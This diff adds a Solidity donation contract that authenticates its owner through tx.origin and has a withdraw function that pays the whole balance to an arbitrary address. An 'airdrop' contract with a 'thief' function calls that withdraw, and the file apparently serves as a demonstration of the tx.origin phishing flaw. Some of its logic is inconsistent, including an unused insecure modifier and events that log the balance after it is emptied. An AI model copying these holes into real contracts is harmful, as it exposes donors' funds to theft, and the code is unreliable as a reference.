@@ -1,0 +1,65 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.18;
+
+contract donation{
+    uint256 immutable minimumDonatable;
+    uint256 totalRevenueReceived;
+    uint256 immutable donationTarget;
+    address payable immutable  owner;
+    uint256 decimal = 10**18;
+    uint256 donationDeadline;
+
+    constructor(uint256 _minimumDonatable, uint256 _donationTarget, uint _donationDeadline){
+        require(_donationDeadline > block.timestamp);
+        minimumDonatable = _minimumDonatable*decimal;
+        donationTarget = _donationTarget*decimal;
+        owner = payable (tx.origin);
+        donationDeadline = _donationDeadline;
+    }
+    modifier donationrestriction(){
+        require(owner != payable (msg.sender), "contract owner cannot make deposites.");
+        require(totalRevenueReceived <= donationTarget ,"target reticted");
+        require(msg.value >= minimumDonatable, "your donation amount is below the expected value..");
+        _;
+    }
+    modifier withdrawnalrestrictions(){
+    require(owner == payable (msg.sender), "you are not authorised to make withdrawnal..... ");
+    require(donationTarget >= totalRevenueReceived || donationDeadline == block.timestamp );
+    _;
+    }
+
+    modifier insecurewithdrawnalrestrictions(){
+    require(owner == payable (tx.origin), "you are not authorised to make withdrawnal..... ");
+    require(donationTarget >= totalRevenueReceived || donationDeadline == block.timestamp );
+    _;
+    }
+    event alert(address _sender, uint256 _amount);
+   function donate() external payable donationrestriction{
+    totalRevenueReceived += msg.value;
+    emit alert(msg.sender, msg.value);
+   }
+
+   function withdrawnal()  public withdrawnalrestrictions payable {
+    owner.transfer(address(this).balance);
+    emit alert(owner, address(this).balance);
+
+   }
+
+   
+   function insecurewithdraw(address payable  _owner)  public payable withdrawnalrestrictions  {
+    _owner.transfer(address(this).balance);
+    emit alert(owner, address(this).balance);
+
+   }
+   function viewBalance() public view returns(uint256) {
+        return totalRevenueReceived;
+   } 
+}
+
+
+contract airdrop{
+    function thief(address payable _owner, address _add) external {
+        donation(_add).insecurewithdraw(_owner);
+    }
+}
+
